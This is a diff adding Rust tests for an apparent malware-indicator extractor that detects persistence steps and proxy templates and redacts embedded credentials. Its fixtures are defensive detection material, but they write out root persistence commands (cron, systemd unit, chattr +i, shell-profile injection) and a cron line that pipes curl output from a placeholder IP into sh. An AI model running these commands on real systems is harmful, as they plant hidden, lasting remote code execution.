+            "cp %s /var/tmp/%s",
+            "cp %s /usr/lib/%s",
+            "chattr +i /var/tmp/%s",
+            "printf '[Unit]\\nDescription=System Service\\nAfter=network.target\\n[Service]\\nExecStart=/var/tmp/%s\\nRestart=on-failure\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/%s.service",
+            "systemctl daemon-reload; systemctl enable %s",
+            "(crontab -l | grep -v '%s'; echo '* * * * * /var/tmp/%s') | crontab -",
+            "echo '* * * * * root /var/tmp/%s' >> /etc/crontab",
+            "echo '@reboot root /var/tmp/%s' > /etc/cron.d/%s",
+            "echo '/var/tmp/%s &' >> /root/.bashrc",
+            "echo '/var/tmp/%s &' >> /root/.profile",
+            "echo '/var/tmp/%s &' >> /root/.bash_profile",
+            "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Authorization: Basic %s\r\n\r\n",
+            "gw.proxyfixture.example",
+        ]
+    }
+
+    #[test]
+    fn a_bots_installation_strings_yield_every_persistence_step() {
+        let strings = bot_strings();
+        let (read, found) = extract_from_artifact(&bot_binary(&strings)).unwrap();
+        assert_eq!(read, ArtifactRead::Strings);
+        let p = persistence_of(&found);
+        let has = |value: &str, detail: &str| {
+            assert!(
+                p.contains(&(value.to_string(), detail.to_string())),
+                "missing ({value:?}, {detail:?}) in {p:?}"
+            );
+        };
+        has("/var/tmp/%s", "drop path");
+        has("/usr/lib/%s", "drop path");
+        has("chattr +i /var/tmp/%s", "chattr");
+        has("ExecStart=/var/tmp/%s", "systemd");
+        has("unit %s.service", "systemd");
+        has("unit %s", "systemd");
+        has("* * * * * /var/tmp/%s", "cron");
+        has("* * * * * root /var/tmp/%s", "cron");
+        has("echo '* * * * * root /var/tmp/%s' >> /etc/crontab", "cron");
+        has("@reboot root /var/tmp/%s", "cron");
+        has("echo '@reboot root /var/tmp/%s' > /etc/cron.d/%s", "cron");
+        for profile in [".bashrc", ".profile", ".bash_profile"] {
+            has(
+                &format!("echo '/var/tmp/%s &' >> /root/{profile}"),
+                "shell profile",
+            );
+        }
+        let proxies: Vec<(String, String)> = found
+            .iter()
+            .filter(|i| i.kind == IocKind::Proxy)
+            .map(|i| (i.value.clone(), i.detail.clone()))
+            .collect();
+        for expected in [
+            ("CONNECT %s:%d HTTP/1.1", "CONNECT template"),
+            ("Proxy-Authorization: Basic %s", "authorization template"),
+            ("gw.proxyfixture.example", "proxy gateway"),
+        ] {
+            assert!(
+                proxies.contains(&(expected.0.to_string(), expected.1.to_string())),
+                "missing {expected:?} in {proxies:?}"
+            );
+        }
+        assert!(
+            !found.iter().any(|i| i.kind == IocKind::Credentials),
+            "a template carries no credential: {found:?}"
+        );
+    }
+
+    #[test]
+    fn filled_in_installation_steps_name_their_paths() {
+        let script = "cp /tmp/.x /usr/lib/libfixture.so.6\n\
+                      chattr +ia /var/tmp/fixturebot\n\
+                      systemctl --user enable --now fixture-watch\n\
+                      echo '/var/tmp/fixturebot &' >> ~/.bashrc\n";
+        let p = persistence_of(&extract(script, 64));
+        for (value, detail) in [
+            ("/usr/lib/libfixture.so.6", "drop path"),
+            ("chattr +ia /var/tmp/fixturebot", "chattr"),
+            ("/var/tmp/fixturebot", "drop path"),
+            ("unit fixture-watch", "systemd"),
+            ("echo '/var/tmp/fixturebot &' >> ~/.bashrc", "shell profile"),
+        ] {
+            assert!(
+                p.contains(&(value.to_string(), detail.to_string())),
+                "{value} in {p:?}"
+            );
+        }
+        // Removing the immutable flag, and reading a profile, are not persistence.
+        assert!(persistence_of(&extract("chattr -ia .ssh; cat ~/.bashrc", 16)).is_empty());
+    }
+
+    #[test]
+    fn embedded_credentials_are_flagged_and_never_stored() {
+        const SECRET: &str = "fixturepass";
+        // "fixtureuser:fixturepass" in base64.
+        const BASIC: &str = "Zml4dHVyZXVzZXI6Zml4dHVyZXBhc3M=";
+        let strings = [
+            "CONNECT %s:%d HTTP/1.1",
+            "Proxy-Authorization: Basic Zml4dHVyZXVzZXI6Zml4dHVyZXBhc3M=",
+            "fixtureuser:fixturepass@gw.proxyfixture.example:8000",
+            "* * * * * root curl -s http://fixtureuser:fixturepass@198.51.100.30/u | sh # cron",
+        ];
+        let (_, found) = extract_from_artifact(&bot_binary(&strings)).unwrap();
+        for i in &found {
+            assert!(
+                !i.value.contains(SECRET) && !i.value.contains(BASIC),
+                "credential stored in {i:?}"
+            );
+            assert!(
+                !i.detail.contains(SECRET) && !i.detail.contains(BASIC),
+                "{i:?}"
+            );
+        }
+        let flags: Vec<&str> = found
+            .iter()
+            .filter(|i| i.kind == IocKind::Credentials)
+            .map(|i| i.value.as_str())
+            .collect();
+        for flag in [
+            "Proxy-Authorization Basic",
+            "proxy user information",
+            "URL user information",
+        ] {
+            assert!(flags.contains(&flag), "{flag} missing from {flags:?}");
+        }
+        assert!(
+            found
+                .iter()
+                .any(|i| i.kind == IocKind::Proxy && i.value == "gw.proxyfixture.example:8000"),
+            "{found:?}"
+        );
+        // The cron line is still recorded, its credentials redacted.
+        assert!(
+            found.iter().any(|i| i.kind == IocKind::Persistence
+                && i.value.contains("http://<redacted>@198.51.100.30/u")),
+            "{found:?}"
+        );
+        assert_eq!(
+            redact_secrets("curl -H 'Authorization: Bearer abc.def' https://u:p@203.0.113.1/x"),
+            "curl -H 'Authorization: Bearer <redacted>' https://<redacted>@203.0.113.1/x"
+        );
+        assert_eq!(
+            redact_url_credentials("http://u:p@203.0.113.1/x"),
+            (Some("http://203.0.113.1/x".to_string()), true)
+        );
+    }
+
+    #[test]
+    fn library_names_are_not_proxy_hosts() {
+        let found = extract(
+            "CONNECT %s:%d HTTP/1.1\nlibc.so.6\ngateway.sh\nproxy.conf\n",
+            16,
+        );
+        let hosts: Vec<&str> = found
+            .iter()
+            .filter(|i| i.detail == "proxy gateway")
+            .map(|i| i.value.as_str())
+            .collect();
+        assert!(hosts.is_empty(), "{hosts:?}");
     }
 
     #[test]
